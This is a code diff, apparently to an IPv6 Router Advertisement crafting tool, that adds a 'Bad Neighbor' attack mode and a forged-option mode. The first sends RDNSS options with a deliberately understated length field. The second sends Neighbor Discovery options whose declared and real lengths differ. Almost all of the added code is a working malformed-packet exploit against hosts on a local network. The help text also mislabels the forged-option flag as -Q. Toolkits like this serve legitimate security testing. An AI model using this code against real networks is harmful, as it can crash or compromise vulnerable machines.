@@ -82,6 +82,7 @@ struct nd_opt_mtu			*mtuopt;
 struct nd_opt_slla			*sllaopt;
 struct nd_opt_prefix_info	*prefixopt;
 struct nd_opt_route_info_l	*routeopt;
+struct nd_opt 				*ndopt;
 
 char						*lasts, *rpref, *endptr;
     
@@ -146,7 +147,8 @@ char						pv6addr[INET6_ADDRSTRLEN];
 uint8_t		 				managed_f=0, other_f=0, home_f=0, proxy_f=0;
 unsigned char 				mtuopt_f=0, sllopt_f=0, sllopta_f=0, prefopt_f=0, hoplimit_f=0;
 unsigned char 				listen_f = 0, floodp_f=0, floods_f=0, floodr_f=0, multicastdst_f=0, floodd_f=0;
-unsigned char				loop_f=0, sleep_f=0, accepted_f=0, newdata_f=0;
+unsigned char				loop_f=0, sleep_f=0, accepted_f=0, newdata_f=0, badneighbor_f=0, fo_f=0;
+unsigned int				fo_type, fo_len, fo_rlen;
 
 struct iface_data	idata;
 struct filters		filters;
@@ -185,12 +187,14 @@ int main(int argc, char **argv){
 		{"route-opt", required_argument, 0, 'R'},
 		{"mtu-opt", required_argument, 0, 'M'},
 		{"rdnss-opt", required_argument, 0, 'N'},
+		{"forged-opt", required_argument, 0, 'O'},		
 		{"link-src-addr", required_argument, 0, 'S'},
 		{"link-dst-addr", required_argument, 0, 'D'},
 		{"flood-prefixes", required_argument, 0, 'f'},
 		{"flood-sources", required_argument, 0, 'F'},
 		{"flood-routes", required_argument, 0, 'w'},
 		{"flood-dns", required_argument, 0, 'W'},
+		{"bad-neighbor", no_argument, 0, 'Q'},
 		{"block-src-addr", required_argument, 0, 'j'},
 		{"block-dst-addr", required_argument, 0, 'k'},
 		{"block-link-src-addr", required_argument, 0, 'J'},
@@ -207,7 +211,7 @@ int main(int argc, char **argv){
 		{0, 0, 0,  0 }
 	};
 
-	char shortopts[]= "i:s:d:A:u:U:H:y:c:t:r:x:moaqp:E:eP:R:M:N:S:D:f:F:w:W:lz:Lj:k:J:K:b:g:B:G:vh";
+	char shortopts[]= "i:s:d:A:u:U:H:y:c:t:r:x:moaqp:E:eP:R:M:N:O:S:D:f:F:w:W:Qj:k:J:K:b:g:B:G:lz:Lvh";
 	char option;
 
 	if(argc<=1){
@@ -813,6 +817,26 @@ int main(int argc, char **argv){
 				mtu[nmtu]= atoi(optarg);
 				nmtu++;
 				break;
+				
+			case 'O':	/* Forged option */
+				if((r= sscanf(optarg, "%u#%u#%u", &fo_type, &fo_len, &fo_rlen)) == 0){
+					puts("Must specify option-type#option-len in \"--forged-option\"");
+					exit(EXIT_FAILURE);
+				}
+				
+				if(r < 2){
+					fo_len = 8;
+				}
+				else if(fo_len > (255 * 8) || (fo_len % 8) != 0){
+					puts("Error in option-length value in \"--forged-option\"");
+					exit(EXIT_FAILURE);
+				}
+					
+				if(r < 3)
+					fo_rlen= fo_len;
+
+				fo_f=1;
+				break;
 
 			case 'w':	/* Flood Routes */
 				nfloodr= atoi(optarg);
@@ -856,7 +880,11 @@ int main(int argc, char **argv){
 				floodd_f= 1;
 				break;
 
-			case 'L':	/* "Listen mode */
+			case 'Q':	/* Bad Neighbor attack */
+				badneighbor_f = 1;
+				break;
+				
+			case 'L':	/* "Listen" mode */
 				listen_f = 1;
 				break;
 
@@ -1236,6 +1264,47 @@ int main(int argc, char **argv){
 		exit(EXIT_FAILURE);
 	}
 
+	if(badneighbor_f){
+		/* If no RDNSS options have been specified, we specify one, insert an address and modify the option
+		   length (adding only 8 bytes to the option length, for our 16-byte address). Otherwise, if an option
+		   had already been received, append our address at the end of the last option, and modify the option
+		   length (adding only 8 bytes to the option length, for our 16-byte address). */
+		   
+		if(nrdnss == 0){
+				rdnsslife[nrdnss]= 1800 + random();
+
+				/* 
+				   The address is set to the a randomized address from the prefix currently delegated by the IANA
+				   for Global Unicast Addresses
+				 */				
+				if ( inet_pton(AF_INET6, "2000::", &rdnss[nrdnss][nrdnssopt[nrdnss]]) <= 0){
+						puts("Error when randomizing address for \"bad neighbor\" attack");
+						perror("inet_pton():");
+						exit(EXIT_FAILURE);
+				}
+				
+				randomize_ipv6_addr(&rdnss[nrdnss][nrdnssopt[nrdnss]], &rdnss[nrdnss][nrdnssopt[nrdnss]], 3);				
+				nrdnssopt[nrdnss]++;
+				nrdnss++;		
+		}
+		else{
+			if(nrdnssopt[nrdnss-1]< MAX_RDNSS_OPT_ADDRS){
+				if ( inet_pton(AF_INET6, charptr, &rdnss[nrdnss-1][nrdnssopt[nrdnss-1]]) <= 0){
+					puts("Error when randomizing address for \"bad neighbor\" attack");
+					perror("inet_pton():");
+					exit(EXIT_FAILURE);
+				}
+
+				randomize_ipv6_addr(&rdnss[nrdnss-1][nrdnssopt[nrdnss-1]], &rdnss[nrdnss-1][nrdnssopt[nrdnss-1]], 3);	
+				nrdnssopt[nrdnss-1]++;
+			}
+			else{
+				puts("Too many addresses in last RDNSS option when adding \"Bad Neighbor\" attack");
+				exit(EXIT_FAILURE);				
+			}
+		}
+	}
+	
 	if(idata.verbose_f){
 		print_attack_info(&idata);
 	}
@@ -1552,6 +1621,8 @@ void init_packet_data(struct iface_data *idata){
  * send the attack packet(s).
  */
 void send_packet(struct iface_data *idata, const u_char *pktdata){
+	unsigned int	i;
+	
 	if(pktdata==NULL){
 		sources=0;	
 	}
@@ -1763,9 +1834,14 @@ void send_packet(struct iface_data *idata, const u_char *pktdata){
 					dnsopt->nd_opt_rdnss_len= (sizeof(struct nd_opt_rdnss_l) + nrdnssopt[dnsopts] \
 								* sizeof(struct in6_addr))/8;
 
+
+					if(badneighbor_f && dnsopts == (nrdnss - 1)){
+						dnsopt->nd_opt_rdnss_len= dnsopt->nd_opt_rdnss_len - 1;
+					}
+				
 					dnsopt->nd_opt_rdnss_lifetime= htonl(rdnsslife[dnsopts]);
 					
-					for(i=0; i< nrdnssopt[dnsopts]; i++)
+					for(i=0; i < nrdnssopt[dnsopts]; i++)
 						dnsopt->nd_opt_rdnss_addr[i] = rdnss[dnsopts][i];
 
 					ptr+= sizeof(struct nd_opt_rdnss_l) + sizeof(struct in6_addr) * nrdnssopt[dnsopts];
@@ -1788,13 +1864,36 @@ void send_packet(struct iface_data *idata, const u_char *pktdata){
 					
 						dnsopt->nd_opt_rdnss_len= (sizeof(struct nd_opt_rdnss_l) + \
 										i * sizeof(struct in6_addr))/8;
-						
+
 						ptr+= sizeof(struct nd_opt_rdnss_l) + sizeof(struct in6_addr) * i;
 						newdata_f=1;
 					}
 				}
 			}
 
+			if(fo_f){
+				if(((ptr+ sizeof(struct nd_opt) + fo_rlen) - v6buffer) <= idata->max_packet_size){		
+					ndopt = (struct nd_opt *) ptr;
+					ndopt->type= (uint8_t) fo_type;
+					ndopt->len= (uint8_t) (fo_len/8);
+					ptr+= sizeof(struct nd_opt);
+
+					if(fo_rlen >= 2)
+						fo_rlen= fo_rlen - 2;
+					else
+						fo_rlen= 0;
+						
+					for(i = 0; i < fo_rlen; i++){
+						*ptr= 0x00;
+						ptr++;
+					}
+				}
+				else{
+					puts("Can't fit forged option into packet");
+					exit(EXIT_FAILURE);
+				}
+			}
+			
 			ra->nd_ra_cksum = 0;
 			ra->nd_ra_cksum = in_chksum(v6buffer, ra, ptr-((unsigned char *)ra), IPPROTO_ICMPV6);
 
@@ -1929,6 +2028,7 @@ void print_help(void){
 	     "  --mtu-opt, -M              MTU option\n"
 	     "  --src-link-opt, -E         Source link-layer address option\n"
 	     "  --add-slla-opt, -e         Add Source link-layer address option\n"
+	     "  --forged-opt, -Q           Forge an ND option TYPE#LEN#REAL_LEN\n"
 	     "  --link-src-addr, -S        Link-layer Source Address\n"
 	     "  --link-dst-addr, -D        Link-layer Destination Address\n"
 	     "  --route-opt, -R            Route Information option (Prefix/Len#pref#lifetime)\n"
@@ -1937,6 +2037,7 @@ void print_help(void){
 	     "  --flood-prefixes, -f       Number of Prefix options to forge randomly\n"
 	     "  --flood-routes, -w         Number of Route Info options to forge randomly\n"
 	     "  --flood-dns, -W            Number of RDNSS options to forge randomly\n"
+	     "  --bad-neighbor, -Q         Implement \"Bad Neighbor\" attack\n"	     
 	     "  --loop, -l                 Send periodic Router Advertisements\n"
 	     "  --sleep, -z                Pause between sending RA messages\n"
 	     "  --listen, -L               Listen to Router Solicitation messagres\n"
@@ -2135,12 +2236,22 @@ void print_attack_info(struct iface_data *idata){
 				printf("%s   ", pprefix);
 			}
 
-			printf("%s", (nrdnssopt[i]?"\n":"(empty)\n"));	    
+			if(badneighbor_f && i == (nrdnss - 1)){
+				puts("(\"Bad Neighbor attack\")");
+			}
+			else{
+				printf("%s", (nrdnssopt[i]?"\n":"(empty)\n"));
+			}
 		}
     }
     else{
 		printf("Flooding with %u Recursive DNS Addresses, with a maximum of %u addresses per option. "
 		       "Lifetime: %u\n", nrdnss, nflooddoa, rdnsslife[0]);
+    }
+    
+    if(fo_f){
+		printf("Forged option (Type=%u, option-length: %u byte%s, real option-length: %u byte%s\n", fo_type, fo_len, \
+				(fo_len>1)?"s":"", fo_rlen, (fo_rlen>1)?"s":"");
     }
 }
 
